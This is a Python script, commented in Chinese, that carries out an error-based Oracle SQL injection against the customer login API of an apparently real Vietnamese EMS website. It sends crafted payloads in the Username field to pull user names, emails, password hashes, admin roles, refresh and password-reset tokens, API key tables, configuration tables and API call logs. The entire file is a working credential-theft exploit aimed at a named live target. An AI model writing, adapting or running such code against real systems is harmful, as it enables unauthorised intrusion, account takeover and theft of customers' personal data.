#!/usr/bin/env python3
"""
提取用户凭证和敏感配置
"""

import requests
import json
import time

class CredentialExtractor:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        data = {"Username": payload, "Password": "test"}
        try:
            return self.session.post(self.target_url, data=json.dumps(data), timeout=30)
        except:
            return None
    
    def extract_via_error(self, query):
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def extract_user_customer_accounts(self):
        """提取USER_CUSTOMER账号（包括管理员）"""
        print("=" * 80)
        print("🔑 提取USER_CUSTOMER用户账号")
        print("=" * 80)
        
        table = 'USER_CUSTOMER'
        
        # 提取前20个用户
        print(f"\n提取用户账号...")
        
        for i in range(1, 21):
            query = f"SELECT USERNAME||'|'||EMAIL||'|'||PASSWORDHASH||'|'||ROLL||'|'||REFRESHTOKEN FROM (SELECT T.*, ROWNUM AS RN FROM EMS.{table} T) WHERE RN={i}"
            result = self.extract_via_error(query)
            
            if result and 'NULL' not in result:
                parts = result.split('|')
                if len(parts) >= 3:
                    username = parts[0]
                    email = parts[1] if len(parts) > 1 else ''
                    password_hash = parts[2] if len(parts) > 2 else ''
                    role = parts[3] if len(parts) > 3 else ''
                    token = parts[4] if len(parts) > 4 else ''
                    
                    print(f"\n  {i}. 用户名: {username}")
                    print(f"     Email: {email}")
                    print(f"     密码Hash: {password_hash[:50] if password_hash else ''}...")
                    print(f"     角色: {role}")
                    
                    if token and len(token) > 10:
                        print(f"     🔑 RefreshToken: {token[:50]}...")
                    
                    # 如果是admin
                    if role and 'admin' in role.lower():
                        print(f"     🚨 这是管理员账号！")
            
            time.sleep(1)
        
        # 查找特定admin账号
        print(f"\n\n查找Admin账号:")
        
        admin_queries = [
            ("用户名包含admin", f"SELECT USERNAME||'|'||EMAIL||'|'||PASSWORDHASH||'|'||ROLL FROM EMS.{table} WHERE UPPER(USERNAME) LIKE '%ADMIN%' AND ROWNUM<=5"),
            ("角色为admin", f"SELECT USERNAME||'|'||EMAIL||'|'||PASSWORDHASH||'|'||ROLL FROM EMS.{table} WHERE UPPER(ROLL) LIKE '%ADMIN%' AND ROWNUM<=5"),
            ("Email包含admin", f"SELECT USERNAME||'|'||EMAIL||'|'||PASSWORDHASH||'|'||ROLL FROM EMS.{table} WHERE UPPER(EMAIL) LIKE '%ADMIN%' AND ROWNUM<=5"),
        ]
        
        for name, query in admin_queries:
            result = self.extract_via_error(query)
            
            if result and 'ORA-' not in result:
                print(f"\n  ✅ {name}:")
                print(f"    {result}")
            
            time.sleep(2)
    
    def extract_infor_key(self):
        """提取INFOR_KEY表（可能包含API密钥）"""
        print("\n" + "=" * 80)
        print("🔐 提取INFOR_KEY表（4条记录）")
        print("=" * 80)
        
        table = 'INFOR_KEY'
        
        # 获取字段
        print(f"\n字段列表:")
        for i in range(1, 11):
            query = f"SELECT COLUMN_NAME FROM (SELECT COLUMN_NAME, ROWNUM AS RN FROM ALL_TAB_COLUMNS WHERE OWNER='EMS' AND TABLE_NAME='{table}') WHERE RN={i}"
            col = self.extract_via_error(query)
            
            if col and col != 'NULL':
                print(f"  {col}")
            
            time.sleep(0.5)
        
        # 提取所有4条记录
        print(f"\n提取所有记录:")
        
        for i in range(1, 5):
            query = f"SELECT * FROM (SELECT T.*, ROWNUM AS RN FROM EMS.{table} T) WHERE RN={i}"
            result = self.extract_via_error(query)
            
            if result:
                print(f"\n  {i}. {result}")
            
            time.sleep(1)
    
    def extract_config_tables(self):
        """提取配置表"""
        print("\n" + "=" * 80)
        print("⚙️  提取配置表")
        print("=" * 80)
        
        tables = ['CONFIG', 'CONFIG_LOAD', 'CONFIG_LOAD_BKU']
        
        for table in tables:
            print(f"\n{'='*80}")
            print(f"表: {table}")
            print(f"{'='*80}")
            
            # 获取记录数
            query_count = f"SELECT COUNT(*) FROM EMS.{table}"
            count = self.extract_via_error(query_count)
            
            if count:
                print(f"记录数: {count}")
            
            time.sleep(1)
            
            # 获取字段
            print(f"\n字段:")
            for i in range(1, 6):
                query_col = f"SELECT COLUMN_NAME FROM (SELECT COLUMN_NAME, ROWNUM AS RN FROM ALL_TAB_COLUMNS WHERE OWNER='EMS' AND TABLE_NAME='{table}') WHERE RN={i}"
                col = self.extract_via_error(query_col)
                
                if col and col != 'NULL':
                    print(f"  {col}")
                
                time.sleep(0.5)
            
            # 提取数据
            print(f"\n数据:")
            
            try:
                count_num = int(count) if count else 0
                max_rows = min(count_num, 10)
                
                for i in range(1, max_rows + 1):
                    query = f"SELECT * FROM (SELECT T.*, ROWNUM AS RN FROM EMS.{table} T) WHERE RN={i}"
                    result = self.extract_via_error(query)
                    
                    if result:
                        print(f"  {i}. {result}")
                    
                    time.sleep(1)
            except:
                pass
    
    def extract_journey_token(self):
        """提取JOURNEYTOKEN_ZNS表"""
        print("\n" + "=" * 80)
        print("🎫 提取JOURNEYTOKEN_ZNS表")
        print("=" * 80)
        
        table = 'JOURNEYTOKEN_ZNS'
        
        # 获取记录数
        query_count = f"SELECT COUNT(*) FROM EMS.{table}"
        count = self.extract_via_error(query_count)
        
        if count:
            print(f"记录数: {count}")
        
        time.sleep(1)
        
        # 获取字段
        print(f"\n字段:")
        for i in range(1, 11):
            query_col = f"SELECT COLUMN_NAME FROM (SELECT COLUMN_NAME, ROWNUM AS RN FROM ALL_TAB_COLUMNS WHERE OWNER='EMS' AND TABLE_NAME='{table}') WHERE RN={i}"
            col = self.extract_via_error(query_col)
            
            if col and col != 'NULL':
                print(f"  {col}")
            
            time.sleep(0.5)
        
        # 提取最新的token
        print(f"\n最新Token记录:")
        
        for i in range(1, 6):
            query = f"SELECT * FROM (SELECT T.*, ROWNUM AS RN FROM EMS.{table} T ORDER BY ROWNUM DESC) WHERE RN={i}"
            result = self.extract_via_error(query)
            
            if result:
                print(f"\n  {i}. {result}")
            
            time.sleep(1)
    
    def check_api_call_log(self):
        """检查API调用日志（可能包含敏感URL和参数）"""
        print("\n" + "=" * 80)
        print("📝 检查API_CALL_LOG")
        print("=" * 80)
        
        table = 'API_CALL_LOG'
        
        # 获取字段
        print(f"\n字段:")
        for i in range(1, 11):
            query_col = f"SELECT COLUMN_NAME FROM (SELECT COLUMN_NAME, ROWNUM AS RN FROM ALL_TAB_COLUMNS WHERE OWNER='EMS' AND TABLE_NAME='{table}') WHERE RN={i}"
            col = self.extract_via_error(query_col)
            
            if col and col != 'NULL':
                print(f"  {col}")
            
            time.sleep(0.5)
        
        # 获取最新的API调用
        print(f"\n最新API调用:")
        
        for i in range(1, 6):
            query = f"SELECT * FROM (SELECT T.*, ROWNUM AS RN FROM EMS.{table} T ORDER BY ROWNUM DESC) WHERE RN={i}"
            result = self.extract_via_error(query)
            
            if result:
                print(f"\n  {i}. {result}")
            
            time.sleep(1)
    
    def search_password_reset_tokens(self):
        """搜索密码重置Token"""
        print("\n" + "=" * 80)
        print("🔓 搜索密码重置Token")
        print("=" * 80)
        
        table = 'USER_CUSTOMER'
        
        # 查找有效的密码重置token
        query = f"SELECT USERNAME||'|'||EMAIL||'|'||TOKENPASSWORDRESET FROM EMS.{table} WHERE TOKENPASSWORDRESET IS NOT NULL AND ROWNUM<=10"
        result = self.extract_via_error(query)
        
        if result:
            print(f"\n有密码重置Token的用户:")
            print(f"  {result}")
        else:
            print(f"\n未找到有效的密码重置Token")
        
        time.sleep(2)
        
        # 查找有效的刷新token
        print(f"\n查找有效的RefreshToken:")
        
        query2 = f"SELECT USERNAME||'|'||REFRESHTOKEN FROM EMS.{table} WHERE REFRESHTOKEN IS NOT NULL AND LENGTH(REFRESHTOKEN)>10 AND ROWNUM<=10"
        result2 = self.extract_via_error(query2)
        
        if result2:
            print(f"  {result2}")
    
    def run_extraction(self):
        """执行提取"""
        print("=" * 80)
        print("🎯 提取敏感凭证和配置")
        print("=" * 80)
        
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功\n")
        
        self.extract_user_customer_accounts()
        self.extract_infor_key()
        self.extract_config_tables()
        self.extract_journey_token()
        self.search_password_reset_tokens()
        self.check_api_call_log()
        
        print("\n" + "=" * 80)
        print("🎉 提取完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    extractor = CredentialExtractor(target_url)
    extractor.run_extraction()
